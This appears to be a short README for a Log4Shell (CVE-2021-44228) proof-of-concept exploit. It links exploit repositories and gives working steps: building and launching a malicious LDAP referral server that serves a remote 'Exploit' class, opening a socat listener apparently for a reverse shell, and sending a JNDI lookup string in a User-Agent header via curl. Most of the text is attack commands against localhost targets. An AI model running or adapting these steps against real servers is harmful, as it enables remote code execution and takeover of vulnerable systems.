# Inspiration

Exploit: https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce.git
Exploit: https://github.com/lunasec-io/lunasec/blob/master/tools/log4shell/payloads/hotpatch-payload/src/main/java/Log4ShellHotpatch.java

LDAP: 

download another project and run *LDAP server implementation returning JNDI references*
[https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java)
```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
# Java 8 required
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```


# Exploit

## Prerequisites

- vulnerable log4j
- com.sun.jndi.ldap.object.trustURLCodebase must be true (defaults to false since https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)

Listen:

```bash

socat -d -d TCP4-LISTEN:4444 STDOUT

```

Go:

````bash

curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Exploit}' http://localhost:1337

```

